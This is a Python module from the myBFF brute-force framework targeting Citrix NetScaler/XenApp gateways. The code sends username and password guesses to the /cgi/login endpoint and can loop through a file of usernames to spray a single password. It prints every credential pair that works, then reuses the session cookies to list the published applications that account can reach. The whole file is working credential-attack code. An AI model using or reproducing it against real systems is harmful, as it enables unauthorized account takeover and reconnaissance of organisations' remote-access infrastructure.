#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class citrixbrute():
    ignore = ['Settings','Log Off']
    def appDetect(self, config, c, cookie1, cookies):
       c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', 'Accept-Language': 'en-US,en;q=0.5'})
       resp1 = c.get(config["protocol"] + '://'+config["HOST"]+':' + config["port"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=True)
       silentDetect = c.get(config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=True)
       cookie2 = silentDetect.cookies['ASP.NET_SessionId']
       cookies2 = dict()
       cookies2['ASP.NET_SessionId'] = cookie2
       cookies2['NSC_AAAC'] = cookie1
       cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
       cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
       cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
       resp = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenAppCAGProd23/auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=True)
       resp2 = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenAppCAGProd23/auth/agesso.aspx', cookies=cookies2, allow_redirects=False, verify=True)
       resp3 = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=True)
       m = re.search('There are no resources currently available for this user.', resp3.text)
       if m:
           print("[-]      No resources available for user.")
       else:
           m = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
           print("[+]      The following apps are accessible to " + config["USERNAME"] + ":")
           for n in m:
               if n not in self.ignore:
                   print('[+]                 ' + n)
    def connectTest(self, config, payload):
        with session() as c:
           cpost = c.post(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/cgi/login', data=payload, allow_redirects=True, verify=True)
           m = re.search('Login Successful.', cpost.text)
           if m:
               print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
               cookie1 = cpost.cookies['NSC_AAAC']
               cookies = dict(NSC_AAAC=cookie1)
               c.cookies.clear()
               self.appDetect(config, c, cookie1, cookies)
           else:
               print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
                if config["UserFile"]:
                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                        for line in lines:
                            config["USERNAME"] = line.strip('\n')
                            payload = {
                                'login': config["USERNAME"],
                                'passwd': config["PASSWORD"]
                                }
                            self.connectTest(config, payload)
                else:
                    payload = {
                        'login': config["USERNAME"],
                        'passwd': config["PASSWORD"]
                        }
                    self.connectTest(config, payload)
